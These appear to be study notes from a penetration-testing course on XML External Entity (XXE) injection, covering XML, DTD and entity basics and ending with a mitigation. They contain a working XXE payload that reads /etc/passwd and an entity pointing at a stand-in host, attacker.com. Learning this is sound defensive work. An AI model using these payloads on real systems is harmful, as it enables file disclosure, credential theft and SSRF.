# XXE (XML External Entity) — Short Notes

## XML Basics

XML is used to store and transfer data.

Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<email>
    <sender>john@test.com</sender>
    <message>Hello</message>
</email>
```

---

# Important Terms

## Tag

```xml
<sender>
```

---

## Element

Complete tag + value:

```xml
<sender>john@test.com</sender>
```

---

## Attribute

Extra info inside tag:

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

- `version`
    
- `encoding`
    

---

## Comment

```xml
<!-- This is comment -->
```

---

# DTD (Document Type Definition)

Defines XML structure and allowed elements.

---

## Internal DTD

DTD inside XML file:

```xml
<?xml version="1.0"?>

<!DOCTYPE email [
    <!ELEMENT email (sender,message)>
    <!ELEMENT sender (#PCDATA)>
    <!ELEMENT message (#PCDATA)>
]>
```

- `#PCDATA` = normal text data.
    

---

## External DTD

DTD loaded from external file:

```xml
<!DOCTYPE email SYSTEM "email.dtd">
```

Or URL:

```xml
<!DOCTYPE email SYSTEM "http://site.com/email.dtd">
```

---

# XML Entity

Entity = XML variable.

## Internal Entity

```xml
<!ENTITY company "HTB">
```

Usage:

```xml
<name>&company;</name>
```

Output:

```xml
<name>HTB</name>
```

---

# External Entity

Loads external resource/file.

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

Usage:

```xml
<data>&xxe;</data>
```

Parser replaces `&xxe;` with file content.

---

# What is XXE?

XXE occurs when:

- User-controlled XML is parsed
    
- External entities are enabled
    

Attacker can read local files or access internal resources.

---

# Basic XXE Payload

```xml
<?xml version="1.0"?>

<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<root>
    <data>&xxe;</data>
</root>
```

---

# How XXE Works

```text
User sends XML
      ↓
XML contains ENTITY
      ↓
Server parser loads ENTITY
      ↓
Reads local file
      ↓
Returns file content
```

---

# SYSTEM Keyword

Used to load external resource.

## Local File

```xml
SYSTEM "file:///etc/passwd"
```

## URL

```xml
SYSTEM "http://attacker.com/test"
```


**Note:** We may also use the `PUBLIC` keyword instead of `SYSTEM` for loading external resources, which is used with publicly declared entities and standards, such as a language code (`lang="en"`). In this module, we'll be using `SYSTEM`, but we should be able to use either in most cases.

---

# Meaning of file:///

```xml
file:///etc/passwd
```

Means:

Read local OS file.

---

# Dangerous Effects of XXE

- Read files
    
- Leak credentials
    
- SSRF
    
- Read source code
    
- DOS attacks
    

---

# Safe vs Vulnerable

## Vulnerable

```php
parser.parse(user_xml)
```

---

## Safe

Disable external entities/DTD.

Example:

```php
libxml_disable_entity_loader(true);
```
